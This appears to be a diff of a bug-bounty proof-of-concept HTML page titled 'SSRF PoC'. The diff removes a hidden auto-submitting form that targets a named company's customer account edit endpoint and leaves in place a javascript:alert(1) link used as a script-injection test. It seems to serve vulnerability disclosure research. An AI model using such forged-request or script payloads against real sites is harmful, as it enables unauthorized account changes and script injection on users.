@@ -1,15 +1,6 @@
 <html>
   <head><title>SSRF PoC</title></head>
   <body>
-    <form id='myform' action='https://merchandising.buses.daimlertruck.com/customer/account/editPost/' method='POST'>
-    <input type='hidden' name='form_key' value='VXD78tIIqapV7zi2'>
-    <input type='hidden' name='firstname' value='GenilsonV'>
-    <input type='hidden' name='lastname' value='Hackerone Researcher'>
-    <input type='hidden' name='assistance_allowed' value='0'>
-    </form>
     <a href='https:javascript:alert(1)'>click</a>
-    <script>
-      //document.getElementById('myform').submit();
-    </script>
   </body>
 </html>
